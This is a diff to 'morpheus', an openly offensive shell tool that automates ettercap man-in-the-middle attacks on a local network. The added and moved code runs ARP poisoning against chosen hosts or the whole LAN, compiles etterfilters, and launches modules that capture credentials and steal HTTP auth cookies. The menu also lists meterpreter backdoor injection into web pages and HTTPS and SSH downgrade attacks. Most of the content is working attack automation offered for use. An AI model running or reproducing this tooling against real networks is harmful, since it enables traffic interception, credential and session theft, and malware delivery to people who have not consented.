@@ -1,7 +1,7 @@
 #!/bin/sh
 ###
 # morpheus - automated ettercap TCP/IP Hijacking tool
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.6
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.7
 # Suspicious-Shell-Activity (SSA) RedTeam develop @2016
 # codename: blue_dreams [ GPL licensed ]
 ###
@@ -9,7 +9,7 @@
 ###
 # Resize terminal windows size befor running the tool (gnome terminal)
 # Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
-resize -s 31 85 > /dev/null
+resize -s 32 85 > /dev/null
 # inicio
 
 
@@ -127,7 +127,7 @@ done
 # Variable declarations
 # ---------------------
 dtr=`date | awk '{print $4}'`        # grab current hour
-V3R="1.6"                            # module version number
+V3R="1.7"                            # module version number
 cnm="Antidote"                       # module codename
 DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
 IPATH=`pwd`                          # grab morpheus.sh install path
@@ -209,10 +209,198 @@ exit
 # START OF SCRIPT FUNTIONS
 #
 #
+# ----------------------------------------
+# PRE-CONFIGURATED TEMPLATE - FIREWALL.EFT
+# ----------------------------------------
+sh_stage1 () {
+echo ""
+echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo "${BlueF}    | ${YellowF}This module acts like a firewall report/block/capture_credentials ${BlueF}|"
+echo "${BlueF}    | ${YellowF}    from the selected targets tcp/udp connections (local lan)     ${BlueF}|"
+echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo ""
+sleep 2
+# run module?
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+
+# get user input to build filter
+echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+
+  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.rb > /dev/null 2>&1
+  sleep 1
+
+  echo ${BlueF}[☠]${white} Edit firewall.eft '(filter)'${RedF}!${Reset};
+  sleep 1
+fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose first target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+  fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose last target to filter through morpheus.\nchose gateway ip, if you dont have any more targets." --entry --width 270) > /dev/null 2>&1
+
+
+  cd $IPATH/filters
+  ed=`hostname`
+  echo "$ed"7 > /tmp/test
+  hOstNaMe=`cat /tmp/test`
+  dIsd=`uname -r`
+  # replace values in template.filter with sed bash command
+  sed -i "s|TaRONE|$fil_one|g" firewall.eft # NO dev/null to report file not existence :D
+  sed -i "s|TaRTWO|$fil_two|g" firewall.eft > /dev/null 2>&1
+  sed -i "s|hOst|$hOstNaMe|g" firewall.eft > /dev/null 2>&1
+  sed -i "s|MoDeM|$GaTe|g" firewall.eft > /dev/null 2>&1
+  sed -i "s|DisTr|$dIsd|g" firewall.eft > /dev/null 2>&1
+  rm /tmp/test /dev/null 2>&1
+  cd $IPATH
+  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
+  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/firewall.eft"
+  sleep 1
+
+    # compiling firewall.eft to be used in ettercap
+    echo ${BlueF}[☠]${white} Compiling firewall.eft${RedF}!${Reset};
+    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/firewall.eft -o $IPATH/output/firewall.ef && sleep 3"
+    sleep 1
+    # port-forward
+    # echo "1" > /proc/sys/net/ipv4/ip_forward
+    cd $IPATH/logs
+
+      # run mitm+filter
+      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+        if [ "$LoGs" = "NO" ]; then
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost// /$gateway//
+        else
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost// /$gateway//
+        fi
+
+      else
+
+        if [ "$LoGs" = "YES" ]; then
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost/ /$gateway/
+        else
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost/ /$gateway/
+        fi
+      fi
+
+
+  # clean up
+  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft > /dev/null 2>&1
+  # port-forward
+  # echo "0" > /proc/sys/net/ipv4/ip_forward
+  sleep 2
+  rm $IPATH/output/firewall.ef > /dev/null 2>&1
+  cd $IPATH
+
+else
+  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  sleep 2
+fi
+}
+
+
+
+
+
+
+# -------------------------------------------
+# SIDEJACKING ATTACK (HTTP) STEAL COOKIE
+# -------------------------------------------
+sh_stage2 () {
+echo ""
+echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo "${BlueF}    | ${YellowF}    This module will display port 80(tcp) and port 443(https)     ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  traffic from selected target host, And it will warn attacker    ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  If any auth cookie its captured And stored 'sidejacking.log'    ${BlueF}|"
+echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo ""
+sleep 2
+# run module?
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+
+# get user input to build filter
+echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+
+  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  cp $IPATH/filters/sidejacking.eft $IPATH/filters/sidejacking.rb > /dev/null 2>&1
+  sleep 1
+
+  echo ${BlueF}[☠]${white} Edit sidejacking.eft '(filter)'${RedF}!${Reset};
+  sleep 1
+ fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+  # replace values in template.filter with sed bash command
+  cd $IPATH/filters
+  sed -i "s|TaRgEt|$fil_one|g" sidejacking.eft # NO dev/null to report file not existence :D
+  cd $IPATH
+  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
+  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/sidejacking.eft"
+  sleep 1
+
+    # compiling packet_drop.eft to be used in ettercap
+    echo ${BlueF}[☠]${white} Compiling sidejacking.eft${RedF}!${Reset};
+    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/sidejacking.eft -o $IPATH/output/sidejacking.ef && sleep 3"
+    sleep 1
+    # port-forward
+    # echo "1" > /proc/sys/net/ipv4/ip_forward
+    cd $IPATH/logs
+
+      # run mitm+filter
+      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+        if [ "$LoGs" = "NO" ]; then
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -M ARP /$rhost// /$gateway//
+        else
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -L $IPATH/logs/sidejacking -M ARP /$rhost// /$gateway//
+        fi
+
+      else
+
+        if [ "$LoGs" = "YES" ]; then
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -M ARP /$rhost/ /$gateway/
+        else
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -L $IPATH/logs/sidejacking -M ARP /$rhost/ /$gateway/
+        fi
+      fi
+
+  # clean up
+  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  mv $IPATH/filters/sidejacking.rb $IPATH/filters/sidejacking.eft > /dev/null 2>&1
+  # port-forward
+  # echo "0" > /proc/sys/net/ipv4/ip_forward
+  sleep 2
+  rm $IPATH/output/sidejacking.ef > /dev/null 2>&1
+  cd $IPATH
+
+else
+  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  sleep 2
+fi
+}
+
+
+
+
+
+
 # -------------------------------------------
 # DROP/KILL TCP/UDP CONNECTION TO/FROM TARGET
 # -------------------------------------------
-sh_stage1 () {
+sh_stage3 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF}   This module will drop/kill any tcp/udp connections attempted   ${BlueF}|"
@@ -294,10 +482,12 @@ fi
 
 
 
+
+
 # -----------------------------------------
 # REDIRECT TARGET TRAFIC TO ANOTHER IP ADDR
 # -----------------------------------------
-sh_stage2 () {
+sh_stage4 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF}   This module will ask user to input an ip address to redirect   ${BlueF}|"
@@ -332,7 +522,7 @@ fil_one=$(zenity --title="☠ DOMAIN TO SPOOF ☠" --text "example: $IP\nWARNING
   cd $IPATH
   sleep 1
 
-# compiling packet_drop.eft to be used in ettercap
+# compiling redirect.eft to be used in ettercap
 xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/redirect.eft"
 echo ${BlueF}[☠]${white} Compiling redirect.eft${RedF}!${Reset};
 sleep 1
@@ -351,7 +541,7 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
         else
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/packet_drop -M ARP /$rhost// /$gateway//
+        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/redirect -M ARP /$rhost// /$gateway//
         fi
 
       else
@@ -361,7 +551,7 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
         else
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/packet_drop -M ARP /$rhost/ /$gateway/
+        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/redirect -M ARP /$rhost/ /$gateway/
         fi
       fi
 
@@ -387,10 +577,11 @@ fi
 
 
 
+
 # -----------------------------------------------
 # REDIRECT TARGET TRAFIC TO GOOGLE SPHERE (prank)
 # -----------------------------------------------
-sh_stage3 () {
+sh_stage5 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF}      This module will redirect target browsing surfing under     ${BlueF}|"
@@ -482,10 +673,12 @@ fi
 
 
 
+
+
 # --------------------------------------------------------
 # CLONE WEBSITE AND INJECT BACKDOOR ON </BODY><IFRAME> TAG
 # --------------------------------------------------------
-sh_stage4 () {
+sh_stage6 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF}    This module will embbeded your payload into a fake webpage    ${BlueF}|"
@@ -593,10 +786,12 @@ fi
 
 
 
+
+
 # --------------------------------
 # INJECT IMAGE INTO TARGET WEBSITE
 # --------------------------------
-sh_stage5 () {
+sh_stage7 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF}    This filter will substitute the html tag '<img src=>'         ${BlueF}|"
@@ -675,188 +870,6 @@ fi
 }
 
 
-
-
-# ----------------------------------------
-# PRE-CONFIGURATED TEMPLATE - FIREWALL.EFT
-# ----------------------------------------
-sh_stage10 () {
-echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}This module acts like a firewall report/block/capture_credentials ${BlueF}|"
-echo "${BlueF}    | ${YellowF}    from the selected targets tcp/udp connections (local lan)     ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
-echo ""
-sleep 2
-# run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
-if [ "$?" -eq "0" ]; then
-
-# get user input to build filter
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-  cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.rb > /dev/null 2>&1
-  sleep 1
-
-  echo ${BlueF}[☠]${white} Edit firewall.eft '(filter)'${RedF}!${Reset};
-  sleep 1
-fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose first target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
-  fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose last target to filter through morpheus.\nchose gateway ip, if you dont have any more targets." --entry --width 270) > /dev/null 2>&1
-
-
-  cd $IPATH/filters
-  ed=`hostname`
-  echo "$ed"7 > /tmp/test
-  hOstNaMe=`cat /tmp/test`
-  dIsd=`uname -r`
-  # replace values in template.filter with sed bash command
-  sed -i "s|TaRONE|$fil_one|g" firewall.eft # NO dev/null to report file not existence :D
-  sed -i "s|TaRTWO|$fil_two|g" firewall.eft > /dev/null 2>&1
-  sed -i "s|hOst|$hOstNaMe|g" firewall.eft > /dev/null 2>&1
-  sed -i "s|MoDeM|$GaTe|g" firewall.eft > /dev/null 2>&1
-  sed -i "s|DisTr|$dIsd|g" firewall.eft > /dev/null 2>&1
-  rm /tmp/test /dev/null 2>&1
-  cd $IPATH
-  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
-  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/firewall.eft"
-  sleep 1
-
-    # compiling firewall.eft to be used in ettercap
-    echo ${BlueF}[☠]${white} Compiling firewall.eft${RedF}!${Reset};
-    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/firewall.eft -o $IPATH/output/firewall.ef && sleep 3"
-    sleep 1
-    # port-forward
-    # echo "1" > /proc/sys/net/ipv4/ip_forward
-    cd $IPATH/logs
-
-      # run mitm+filter
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
-      sleep 2
-      if [ "$IpV" = "ACTIVE" ]; then
-        if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost// /$gateway//
-        else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost// /$gateway//
-        fi
-
-      else
-
-        if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost/ /$gateway/
-        else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost/ /$gateway/
-        fi
-      fi
-
-
-  # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft > /dev/null 2>&1
-  # port-forward
-  # echo "0" > /proc/sys/net/ipv4/ip_forward
-  sleep 2
-  rm $IPATH/output/firewall.ef > /dev/null 2>&1
-  cd $IPATH
-
-else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
-  sleep 2
-fi
-}
-
-
-
-
-# -------------------------------------------
-# SIDEJACKING ATTACK (HTTP) STEAL COOKIE
-# -------------------------------------------
-sh_stage11 () {
-echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}    This module will display port 80(tcp) and port 443(https)     ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  traffic from selected target host, And it will warn attacker    ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  If any auth cookie its captured And stored 'sidejacking.log'    ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
-echo ""
-sleep 2
-# run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
-if [ "$?" -eq "0" ]; then
-
-# get user input to build filter
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-  cp $IPATH/filters/sidejacking.eft $IPATH/filters/sidejacking.rb > /dev/null 2>&1
-  sleep 1
-
-  echo ${BlueF}[☠]${white} Edit sidejacking.eft '(filter)'${RedF}!${Reset};
-  sleep 1
- fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
-  # replace values in template.filter with sed bash command
-  cd $IPATH/filters
-  sed -i "s|TaRgEt|$fil_one|g" sidejacking.eft # NO dev/null to report file not existence :D
-  cd $IPATH
-  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
-  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/sidejacking.eft"
-  sleep 1
-
-    # compiling packet_drop.eft to be used in ettercap
-    echo ${BlueF}[☠]${white} Compiling sidejacking.eft${RedF}!${Reset};
-    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/sidejacking.eft -o $IPATH/output/sidejacking.ef && sleep 3"
-    sleep 1
-    # port-forward
-    # echo "1" > /proc/sys/net/ipv4/ip_forward
-    cd $IPATH/logs
-
-      # run mitm+filter
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
-      sleep 2
-      if [ "$IpV" = "ACTIVE" ]; then
-        if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -M ARP /$rhost// /$gateway//
-        else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -L $IPATH/logs/sidejacking -M ARP /$rhost// /$gateway//
-        fi
-
-      else
-
-        if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -M ARP /$rhost/ /$gateway/
-        else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -L $IPATH/logs/sidejacking -M ARP /$rhost/ /$gateway/
-        fi
-      fi
-
-  # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/sidejacking.rb $IPATH/filters/sidejacking.eft > /dev/null 2>&1
-  # port-forward
-  # echo "0" > /proc/sys/net/ipv4/ip_forward
-  sleep 2
-  rm $IPATH/output/sidejacking.ef > /dev/null 2>&1
-  cd $IPATH
-
-else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
-  sleep 2
-fi
-}
 
 
 
@@ -941,6 +954,8 @@ fi
 
 
 
+
+
 # ------------------------------------------------
 # NMAP FUNTION TO REPORT LIVE TARGETS IN LOCAL LAN
 # ------------------------------------------------
@@ -976,7 +991,10 @@ fi
 
 
 
+
+#
 # easter egg: targets to test modules.
+#
 sh_stageT () {
 echo ""
 echo "${white}    Available targets For testing [HTTP] "
@@ -997,7 +1015,12 @@ read OP
 }
 
 
+
+
+
+#
 # help in scripting ;)
+#
 sh_help () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
@@ -1007,6 +1030,10 @@ echo "${BlueF}    ╘ ${white}Please wait, open webbrowser."
 sleep 3
 xdg-open "https://github.com/r00t-3xp10it/morpheus/issues"
 }
+
+
+
+
 
 # -------------------------
 # FUNTION TO EXIT FRAMEWORK
@@ -1045,19 +1072,19 @@ cat << !
 echo ${BlueF}"    VERSION:${YellowF}$V3R${BlueF} DISTRO:${YellowF}$DiStR0${BlueF} IP:${YellowF}$IP${BlueF} INTERFACE:${YellowF}$InT3R${BlueF} IPv6:${YellowF}$IpV"${BlueF}
 cat << !
     ╔────────╦──────────────────────────────────────────────────────────╗
-    | OPTION |                 DESCRIPTION(filters)                     |
+    | OPTION |                 DESCRIPTION(filters)               v:$V3R |
     ╠────────╩──────────────────────────────────────────────────────────╣
-    |   1    -  Drop all packets from/to target  [ packets drop,kill  ] |
-    |   2    -  Redirect browser traffic         [ to another domain  ] |
-    |   3    -  Redirect browser traffic         [ to google sphere   ] |
-    |   4    -  Inject backdoor into </body>     [ meterpreter.exe    ] |
-    |   5    -  Replace website images           [ img src=http://www ] |
-    |   6    -  Replace website text             [ replace: worlds    ] |
-    |   7    -  https downgrade attack demo      [ replace: https     ] |
-    |   8    -  ssh downgrade attack demo        [ replace: SSH-1.99  ] |
+    |   1    -  Firewall filter tcp/udp          [report/capture_creds] |
+    |   2    -  Sidejacking (http)               [capture auth cookie ] |
+    |   3    -  Drop all packets from/to         [ packets drop,kill  ] |
+    |   4    -  Redirect browser traffic         [ to another domain  ] |
+    |   5    -  Redirect browser traffic         [ to google sphere   ] |
+    |   6    -  Inject backdoor into </body>     [ meterpreter.exe    ] |
+    |   7    -  Replace website images           [ img src=http://www ] |
+    |   8    -  Replace website text             [ replace: worlds    ] |
     |   9    -  Rotate website document 180º     [ CSS3 injection     ] |
-    |  10    -  firewall filter tcp/udp          [report/capture_creds] |
-    |  11    -  Sidejacking (http)               [capture auth cookie ] |
+    |  10    -  https downgrade attack demo      [ replace: https     ] |
+    |  11    -  ssh downgrade attack demo        [ replace: SSH-1.99  ] |
     |                                                                   |
     |   W    -  Write your own filter            [ use morpheus tool  ] |
     |   S    -  Scan LAN for live hosts          [ use nmap framework ] |
